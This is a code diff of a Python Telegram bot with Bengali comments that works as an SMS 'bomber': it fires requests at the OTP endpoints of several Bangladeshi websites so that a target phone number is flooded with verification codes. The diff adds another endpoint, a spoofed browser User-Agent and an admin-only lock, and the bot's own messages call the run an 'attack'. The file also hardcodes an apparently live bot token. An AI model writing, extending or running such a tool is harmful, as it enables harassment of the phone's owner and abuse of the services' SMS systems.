@@ -3,25 +3,36 @@ import telebot
 import requests
 from flask import Flask, request
 
-# আপনার টেলিগ্রাম বট টোকেন
+# আপনার কনফিগারেশন
 TOKEN = "8522736474:AAEeqI9riuBrlp8sCSOLyVXUtXHkbddru48"
+ADMIN_ID = 6900182564
+
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
-# ওটিপি পাঠানোর জন্য শক্তিশালী এপিআই ফাংশন
+# ওটিপি পাঠানোর ফাংশন (উন্নত এপিআই সহ)
 def send_otp(phone):
+    # ১১ ডিজিট ঠিক আছে কি না নিশ্চিত করা
+    if not (phone.startswith("01") and len(phone) == 11):
+        return 0
+    
     apis = [
         f"https://bikroy.com/data/is-number-registered?phone={phone}",
         f"https://www.shajgoj.com/wp-admin/admin-ajax.php?action=login_mobile_otp&mobile={phone}",
         f"https://osudpotro.com/api/v1/users/send-otp?phone={phone}",
         f"https://redx.com.bd/api/v1/send-otp?phone={phone}",
-        f"https://paperfly.com.bd/api/v1/customer-login-otp?phone={phone}"
+        f"https://paperfly.com.bd/api/v1/customer-login-otp?phone={phone}",
+        f"https://api.btracmotors.com/api/v1/auth/send-otp?mobile={phone}"
     ]
+    
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+    }
     
     success = 0
     for url in apis:
         try:
-            r = requests.get(url, timeout=5)
+            r = requests.get(url, headers=headers, timeout=5)
             if r.status_code == 200:
                 success += 1
         except:
@@ -30,35 +41,37 @@ def send_otp(phone):
 
 @bot.message_handler(commands=['start'])
 def start(message):
+    # নিরাপত্তা চেক: শুধু আপনি ব্যবহার করতে পারবেন
+    if message.from_user.id != ADMIN_ID:
+        bot.reply_to(message, "❌ **দুঃখিত বস! এই বটটি ব্যবহারের অনুমতি আপনার নেই।**")
+        return
+
     markup = telebot.types.InlineKeyboardMarkup()
-    markup.add(telebot.types.InlineKeyboardButton("💣 বোম্বিং শুরু করুন", callback_data="bomb"))
+    markup.add(telebot.types.InlineKeyboardButton("💣 অ্যাটাক শুরু করুন", callback_data="start_bomb"))
     
-    welcome_text = (
-        f"👋 স্বাগতম **{message.from_user.first_name}**!\n"
-        f"এটি একটি শক্তিশালী SMS Bomber বট।\n\n"
-        f"বোম্বিং করতে নিচের বাটনটি চাপুন।"
-    )
-    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")
+    bot.send_message(message.chat.id, 
+                     f"👋 **স্বাগতম বস!**\n\nবট এখন আপনার জন্য প্রস্তুত। বোম্বিং করতে নিচের বাটনে ক্লিক করুন।", 
+                     reply_markup=markup, parse_mode="Markdown")
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
-    if call.data == "bomb":
-        msg = bot.send_message(call.message.chat.id, "📞 **টার্গেট নম্বরটি দিন (১১ ডিজিট):**", parse_mode="Markdown")
-        bot.register_next_step_handler(msg, start_attack)
+    if call.data == "start_bomb":
+        msg = bot.send_message(call.message.chat.id, "📞 **টার্গেট নম্বরটি দিন (যেমন: 017xxxxxxxx):**", parse_mode="Markdown")
+        bot.register_next_step_handler(msg, process_bombing)
 
-def start_attack(message):
+def process_bombing(message):
     phone = message.text
     if len(phone) == 11 and phone.isdigit():
-        bot.send_message(message.chat.id, f"🚀 **{phone}** নম্বরে অ্যাটাক শুরু হয়েছে...")
+        bot.send_message(message.chat.id, f"🚀 **{phone}** নম্বরে অ্যাটাক শুরু হয়েছে। দয়া করে অপেক্ষা করুন...")
         
-        # ওটিপি পাঠানো হচ্ছে
-        count = send_otp(phone)
+        # ওটিপি পাঠানো
+        hits = send_otp(phone)
         
-        bot.send_message(message.chat.id, f"✅ অ্যাটাক সম্পন্ন! {count}টি ওটিপি পাঠানো হয়েছে।")
+        bot.send_message(message.chat.id, f"✅ **অ্যাটাক সফল!**\n\nমোট {hits}টি ওটিপি পাঠানো হয়েছে।\nআবার করতে চাইলে /start দিন।")
     else:
-        bot.send_message(message.chat.id, "❌ ভুল নম্বর! সঠিক ১১ ডিজিটের নম্বর দিন।")
+        bot.send_message(message.chat.id, "❌ **ভুল নম্বর!** ১১ ডিজিটের সঠিক নম্বর দিন। /start দিয়ে আবার চেষ্টা করুন।")
 
-# Render Webhook Logic
+# Render Webhook logic
 @app.route('/' + TOKEN, methods=['POST'])
 def getMessage():
     bot.process_new_updates([telebot.types.Update.de_json(request.stream.read().decode("utf-8"))])
